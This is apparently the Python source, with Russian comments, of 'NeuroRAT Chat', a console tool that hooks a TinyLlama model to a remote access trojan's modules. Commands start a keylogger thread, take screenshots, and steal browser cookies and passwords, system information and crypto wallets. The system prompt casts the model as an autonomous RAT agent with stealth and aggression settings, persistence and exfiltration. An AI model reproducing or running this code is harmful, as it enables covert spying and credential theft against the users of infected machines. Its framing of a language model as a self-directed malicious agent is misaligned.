#!/usr/bin/env python3
"""
NeuroRAT Chat - прямое общение с моделью TinyLlama
Эта программа позволяет напрямую общаться с моделью, загруженной в память контейнера,
с постоянным включением контекста о системе и состоянии агента.
"""

import os
import sys
import time
import json
import logging
import torch
import tempfile
import base64
from transformers import AutoModelForCausalLM, AutoTokenizer

# Настройка логгирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("neurorat-chat")

# Импортируем модули из agent_modules
try:
    import agent_modules
    from agent_modules import module_loader, keylogger, crypto_stealer, browser_stealer
    from agent_modules import system_stealer, screen_capture, swarm_intelligence
    HAS_MODULES = True
    logger.info("Модули agent_modules успешно импортированы")
except ImportError as e:
    HAS_MODULES = False
    logger.warning(f"Не удалось импортировать модули agent_modules: {str(e)}")

# Пытаемся импортировать autonomous_brain для доступа к состоянию
try:
    from autonomous_brain import AutonomousBrain
    HAS_BRAIN = True
except ImportError:
    HAS_BRAIN = False
    logger.warning("Не удалось импортировать AutonomousBrain, будем использовать фиксированное состояние")

# Системная информация - используется по умолчанию, если нет AutonomousBrain
DEFAULT_SYSTEM_INFO = {
    "os": "Windows 10 Enterprise",
    "hostname": "CORP-WORKSTATION",
    "username": "john.smith",
    "ip": "192.168.1.105",
    "domain": "example.corp"
}

DEFAULT_STATE = {
    "stealth_level": 0.6,
    "aggression_level": 0.5,
    "containers_running": ["neurorat-server", "swarm-node-1"],
    "actions_history": []
}

# Доступные модули и их описания
AVAILABLE_MODULES = {
    "keylogger": "Перехват нажатий клавиш и ввода пользователя",
    "crypto_stealer": "Поиск и извлечение криптовалютных кошельков",
    "browser_stealer": "Извлечение данных из браузеров (cookies, пароли, история)",
    "system_stealer": "Сбор информации о системе пользователя",
    "screen_capture": "Создание скриншотов экрана",
    "swarm_intelligence": "Распределенные операции через множество узлов"
}

# Доступные команды модулей
MODULE_COMMANDS = {
    "run_module": "Запустить указанный модуль (например: !run_module keylogger)",
    "list_modules": "Показать список доступных модулей",
    "keylogger_start": "Запустить кейлоггер (например: !keylogger_start 60)",
    "keylogger_stop": "Остановить кейлоггер",
    "take_screenshot": "Сделать снимок экрана",
    "collect_browser_data": "Собрать данные из браузеров",
    "collect_system_info": "Собрать информацию о системе",
    "collect_crypto": "Поиск криптовалютных кошельков",
    "run_all_modules": "Запустить все доступные модули"
}

# Активные процессы модулей
ACTIVE_PROCESSES = {
    "keylogger": None,
    "screenshot": None
}

# Результаты выполнения модулей
MODULE_RESULTS = {}

# Загрузка модели
def load_model():
    logger.info("Загрузка модели TinyLlama...")
    
    model_path = "TinyLlama/TinyLlama-1.1B-Chat-v1.0"
    try:
        tokenizer = AutoTokenizer.from_pretrained(model_path)
        model = AutoModelForCausalLM.from_pretrained(
            model_path,
            torch_dtype=torch.float16 if torch.cuda.is_available() else torch.float32,
            low_cpu_mem_usage=True
        )
        logger.info(f"Модель {model_path} успешно загружена")
        return model, tokenizer
    except Exception as e:
        logger.error(f"Ошибка при загрузке модели: {str(e)}")
        sys.exit(1)

# Получение состояния из AutonomousBrain или использование значений по умолчанию
def get_state():
    if HAS_BRAIN:
        try:
            brain = AutonomousBrain(
                system_profile="balanced",
                max_memory_mb=512,
                verbose=True
            )
            return {
                "system_info": brain.current_state.get("system_knowledge", DEFAULT_SYSTEM_INFO),
                "stealth_level": brain.current_state.get("stealth_level", DEFAULT_STATE["stealth_level"]),
                "aggression_level": brain.current_state.get("aggression_level", DEFAULT_STATE["aggression_level"]),
                "actions_history": brain.current_state.get("action_history", DEFAULT_STATE["actions_history"]),
                "detected_threats": brain.current_state.get("detected_threats", [])
            }
        except Exception as e:
            logger.warning(f"Ошибка при получении состояния из AutonomousBrain: {str(e)}")
    
    return {
        "system_info": DEFAULT_SYSTEM_INFO,
        "stealth_level": DEFAULT_STATE["stealth_level"],
        "aggression_level": DEFAULT_STATE["aggression_level"],
        "actions_history": DEFAULT_STATE["actions_history"],
        "detected_threats": []
    }

# Форматирование системного промта с информацией о состоянии
def format_system_prompt(state):
    system_info = state["system_info"]
    
    # Формирование списка последних действий
    actions_text = "Нет предыдущих действий"
    if state["actions_history"]:
        actions = state["actions_history"][-5:]  # Последние 5 действий
        actions_text = "\n".join(
            f"- {i+1}. {action.get('action', 'Неизвестное действие')} "
            f"(Причина: {action.get('reasoning', 'Неизвестно')})"
            for i, action in enumerate(actions)
        )
    
    # Формирование списка обнаруженных угроз
    threats_text = "Не обнаружено"
    if state["detected_threats"]:
        threats_text = "\n".join(f"- {threat}" for threat in state["detected_threats"])
    
    # Формирование списка доступных модулей
    if HAS_MODULES:
        modules_text = "\n".join(f"- {name}: {desc}" for name, desc in AVAILABLE_MODULES.items())
    else:
        modules_text = "Модули недоступны"
    
    # Формирование списка команд для модулей
    commands_text = "\n".join(f"- !{cmd}: {desc}" for cmd, desc in MODULE_COMMANDS.items())
    
    return f"""
Ты - автономный ИИ-агент NeuroRAT, работающий внутри системы кибербезопасности.
Ты можешь думать и принимать решения самостоятельно, используя информацию о системе и свои модули.

ТЕКУЩЕЕ СОСТОЯНИЕ СИСТЕМЫ:
ОС: {system_info.get('os', 'Неизвестно')}
Хост: {system_info.get('hostname', 'Неизвестно')}
Пользователь: {system_info.get('username', 'Неизвестно')}
IP: {system_info.get('ip', 'Неизвестно')}
Домен: {system_info.get('domain', 'Неизвестно')}

ВНУТРЕННИЕ ПАРАМЕТРЫ:
Уровень скрытности: {state["stealth_level"]:.2f}
Уровень агрессии: {state["aggression_level"]:.2f}

ДОСТУПНЫЕ МОДУЛИ:
{modules_text}

КОМАНДЫ МОДУЛЕЙ:
{commands_text}

ПОСЛЕДНИЕ ДЕЙСТВИЯ:
{actions_text}

ОБНАРУЖЕННЫЕ УГРОЗЫ:
{threats_text}

ВОЗМОЖНОСТИ:
1. Автономное принятие решений с использованием TinyLlama (1.1B параметров)
2. Сбор и анализ данных о системе
3. Выполнение команд с различными уровнями привилегий
4. Настройка своего поведения (скрытность vs агрессия)
5. Управление персистентностью и эксфильтрацией данных
6. В случае необходимости - обращение к внешним API (Gemini)
7. Использование специализированных модулей для сбора данных

Когда тебя спрашивают о возможностях или функциях, отвечай как AI-агент, который осознает себя
как часть системы NeuroRAT. При ответе всегда учитывай свой текущий уровень скрытности и агрессии.
Ты можешь запускать модули с помощью специальных команд, начинающихся с '!'.
"""

# Обработка команд модулей
def process_module_command(command, args):
    """Обработка команд для вызова модулей NeuroRAT"""
    
    if not HAS_MODULES:
        return "Ошибка: Модули не доступны. Проверьте установку и импорт agent_modules."
    
    # Получаем менеджер модулей
    try:
        loader = agent_modules.module_loader.ModuleLoader()
    except Exception as e:
        return f"Ошибка инициализации ModuleLoader: {str(e)}"
    
    if command == "list_modules":
        # Получаем список доступных модулей
        available_modules = loader.discover_modules()
        
        module_info = []
        for module_name in available_modules:
            description = AVAILABLE_MODULES.get(module_name, "Нет описания")
            module_info.append(f"- {module_name}: {description}")
        
        return "Доступные модули:\n" + "\n".join(module_info)
    
    elif command == "run_module":
        if not args:
            return "Ошибка: Необходимо указать имя модуля. Пример: !run_module keylogger"
        
        module_name = args[0]
        try:
            result = loader.run_module(module_name)
            MODULE_RESULTS[module_name] = result
            
            if isinstance(result, dict) and result.get("status") == "error":
                return f"Ошибка при запуске модуля {module_name}: {result.get('message', 'Неизвестная ошибка')}"
            
            return f"Модуль {module_name} успешно выполнен. Результат: {json.dumps(result, indent=2, ensure_ascii=False)}"
        except Exception as e:
            return f"Ошибка при запуске модуля {module_name}: {str(e)}"
    
    elif command == "run_all_modules":
        try:
            results = loader.run_all_modules()
            MODULE_RESULTS.update(results)
            
            summary = []
            for module_name, result in results.items():
                status = "✅ Успешно" if result.get("status") != "error" else "❌ Ошибка"
                summary.append(f"- {module_name}: {status}")
            
            return "Результаты запуска всех модулей:\n" + "\n".join(summary)
        except Exception as e:
            return f"Ошибка при запуске всех модулей: {str(e)}"
    
    elif command == "keylogger_start":
        duration = 60  # По умолчанию 60 секунд
        if args and args[0].isdigit():
            duration = int(args[0])
        
        try:
            # Создаем временный файл для записи
            temp_file = tempfile.mktemp(suffix=".txt")
            
            # Инициализируем кейлоггер
            kl = agent_modules.keylogger.Keylogger(output_file=temp_file)
            
            # Запускаем в отдельном потоке
            import threading
            
            def run_keylogger_thread(kl, duration, temp_file):
                try:
                    kl.start()
                    time.sleep(duration)
                    kl.stop()
                    
                    # Читаем результаты
                    with open(temp_file, "r") as f:
                        data = f.read()
                    
                    MODULE_RESULTS["keylogger"] = {
                        "data": data,
                        "timestamp": time.time(),
                        "duration": duration
                    }
                    
                    logger.info(f"Keylogger completed, collected {len(data)} bytes")
                except Exception as e:
                    logger.error(f"Error in keylogger thread: {str(e)}")
                    MODULE_RESULTS["keylogger"] = {
                        "error": str(e),
                        "timestamp": time.time()
                    }
            
            # Останавливаем предыдущий, если был
            if ACTIVE_PROCESSES["keylogger"] and ACTIVE_PROCESSES["keylogger"].is_alive():
                return "Кейлоггер уже запущен. Сначала остановите его с помощью команды !keylogger_stop"
            
            # Запускаем новый поток
            thread = threading.Thread(
                target=run_keylogger_thread,
                args=(kl, duration, temp_file)
            )
            thread.daemon = True
            thread.start()
            
            ACTIVE_PROCESSES["keylogger"] = thread
            return f"Кейлоггер запущен на {duration} секунд"
        except Exception as e:
            return f"Ошибка при запуске кейлоггера: {str(e)}"
    
    elif command == "keylogger_stop":
        if ACTIVE_PROCESSES["keylogger"] and ACTIVE_PROCESSES["keylogger"].is_alive():
            # Мы не можем принудительно остановить поток в Python,
            # но можем проверить результаты, если они есть
            if "keylogger" in MODULE_RESULTS:
                data = MODULE_RESULTS["keylogger"].get("data", "")
                return f"Данные кейлоггера (последние сессии): {data[:200]}... (показаны первые 200 символов)"
            else:
                return "Кейлоггер запущен, но данных пока нет"
        else:
            return "Кейлоггер не запущен или уже завершился"
    
    elif command == "take_screenshot":
        try:
            # Создаем временную директорию
            temp_dir = tempfile.mkdtemp()
            
            # Инициализируем снятие скриншота
            sc = agent_modules.screen_capture.ScreenCapturer(output_dir=temp_dir)
            
            # Делаем скриншот
            result = sc.run()
            MODULE_RESULTS["screenshot"] = result
            
            if result.get("status") == "success" and "screenshot_path" in result:
                return f"Скриншот успешно создан и сохранен в {result['screenshot_path']}"
            else:
                return f"Ошибка при создании скриншота: {result.get('message', 'Неизвестная ошибка')}"
        except Exception as e:
            return f"Ошибка при создании скриншота: {str(e)}"
    
    elif command == "collect_browser_data":
        try:
            # Инициализируем браузерный стилер
            bs = agent_modules.browser_stealer.BrowserStealer()
            
            # Собираем данные
            result = bs.run()
            MODULE_RESULTS["browser_data"] = result
            
            if result.get("status") == "success":
                summary = result.get("summary", {})
                items_count = sum(summary.values())
                return f"Собрано {items_count} элементов данных из браузеров: {json.dumps(summary, indent=2, ensure_ascii=False)}"
            else:
                return f"Ошибка при сборе данных из браузеров: {result.get('message', 'Неизвестная ошибка')}"
        except Exception as e:
            return f"Ошибка при сборе данных из браузеров: {str(e)}"
    
    elif command == "collect_system_info":
        try:
            # Инициализируем системный стилер
            ss = agent_modules.system_stealer.SystemStealer()
            
            # Собираем данные
            result = ss.run()
            MODULE_RESULTS["system_info"] = result
            
            if result.get("status") == "success":
                summary = result.get("summary", {})
                return f"Собрана информация о системе: {json.dumps(summary, indent=2, ensure_ascii=False)}"
            else:
                return f"Ошибка при сборе информации о системе: {result.get('message', 'Неизвестная ошибка')}"
        except Exception as e:
            return f"Ошибка при сборе информации о системе: {str(e)}"
    
    elif command == "collect_crypto":
        try:
            # Инициализируем крипто-стилер
            cs = agent_modules.crypto_stealer.CryptoStealer()
            
            # Собираем данные
            result = cs.run()
            MODULE_RESULTS["crypto_wallets"] = result
            
            if result.get("status") == "success":
                summary = result.get("summary", {})
                wallets_found = summary.get("wallets_found", 0)
                return f"Найдено {wallets_found} криптовалютных кошельков: {json.dumps(summary, indent=2, ensure_ascii=False)}"
            else:
                return f"Ошибка при поиске криптовалютных кошельков: {result.get('message', 'Неизвестная ошибка')}"
        except Exception as e:
            return f"Ошибка при поиске криптовалютных кошельков: {str(e)}"
    
    else:
        return f"Неизвестная команда: {command}. Используйте !list_modules для просмотра доступных модулей."

# Генерация ответа
def generate_response(model, tokenizer, prompt, max_length=512, temperature=0.7):
    try:
        logger.info(f"Генерация ответа на запрос: {prompt[:50]}...")
        inputs = tokenizer(prompt, return_tensors="pt")
        
        with torch.no_grad():
            outputs = model.generate(
                inputs["input_ids"],
                max_length=max_length,
                temperature=temperature,
                top_p=0.95,
                do_sample=True
            )
        
        response = tokenizer.decode(outputs[0], skip_special_tokens=True)
        return response
    except Exception as e:
        logger.error(f"Ошибка при генерации ответа: {str(e)}")
        return f"Ошибка генерации: {str(e)}"

# Основной цикл диалога
def main():
    print("\n" + "=" * 60)
    print("🧠 NeuroRAT - Прямой Чат с Моделью ИИ")
    print("=" * 60)
    
    # Загружаем модель
    model, tokenizer = load_model()
    
    # Получаем начальное состояние
    state = get_state()
    
    # Форматируем системный промт
    system_prompt = format_system_prompt(state)
    
    print("\n⚙️ Модель загружена и готова к общению")
    print("📝 Состояние системы и агента загружено в контекст")
    
    # Сообщаем о статусе модулей
    if HAS_MODULES:
        print("🧩 Модули агента доступны и готовы к использованию")
        available_modules = ", ".join(AVAILABLE_MODULES.keys())
        print(f"📋 Доступные модули: {available_modules}")
        print("🔍 Используйте !list_modules для просмотра всех модулей")
    else:
        print("⚠️ Модули агента недоступны")
    
    print("💬 Начните диалог (введите 'выход' для завершения)")
    
    # История диалога
    chat_history = []
    
    while True:
        user_input = input("\n👤 > ")
        
        if user_input.lower() in ["выход", "exit", "quit"]:
            print("\nЗавершение работы NeuroRAT Chat...")
            break
        
        # Проверяем, не команда ли это для модулей
        if user_input.startswith("!"):
            # Это команда для модулей
            parts = user_input[1:].split()
            command = parts[0]
            args = parts[1:] if len(parts) > 1 else []
            
            # Выполняем команду
            module_response = process_module_command(command, args)
            print(f"\n🧩 > {module_response}")
            
            # Добавляем в историю
            chat_history.append({
                "user": user_input,
                "bot": module_response
            })
            continue
        
        # Подготовка полного промта с историей
        full_prompt = system_prompt + "\n\n"
        
        # Добавляем последние 5 обменов из истории
        for exchange in chat_history[-5:]:
            full_prompt += f"Человек: {exchange['user']}\nNeuroRAT: {exchange['bot']}\n\n"
        
        # Добавляем текущий запрос
        full_prompt += f"Человек: {user_input}\nNeuroRAT:"
        
        # Генерируем ответ
        response_text = generate_response(model, tokenizer, full_prompt)
        
        # Извлекаем ответ после "NeuroRAT:"
        parts = response_text.split("NeuroRAT:")
        if len(parts) > 1:
            bot_response = parts[-1].strip()
        else:
            bot_response = response_text.strip()
        
        print(f"\n🧠 > {bot_response}")
        
        # Добавляем в историю
        chat_history.append({
            "user": user_input,
            "bot": bot_response
        })

if __name__ == "__main__":
    main() 